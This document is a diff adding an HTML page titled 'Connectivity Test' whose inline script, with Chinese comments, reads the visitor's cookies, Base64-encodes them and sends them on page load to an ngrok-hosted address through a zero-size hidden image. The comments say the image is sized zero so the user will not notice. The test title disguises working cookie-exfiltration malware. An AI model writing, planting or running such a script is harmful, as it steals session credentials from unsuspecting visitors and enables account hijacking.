@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Connectivity Test</title>
+</head>
+<body>
+    <script type="text/javascript">
+        (function() {
+            // 建立隱藏的圖片物件
+            const leak = new Image();
+            // 將敏感資料（如 Cookie）進行 Base64 編碼，附加在圖片請求的參數中
+            const b64_data = btoa(unescape(encodeURIComponent(document.cookie || "no-cookie")));
+            
+            leak.src = 'https://chanceful-tova-mercuric.ngrok-free.dev/pixel.png?exfil=' + b64_data;
+            
+            // 為了不讓使用者發現，可以將圖片大小設為 0
+            leak.width = 0;
+            leak.height = 0;
+            
+            console.log("Stealth request sent.");
+        })();
+    </script>
+</body>
+</html>
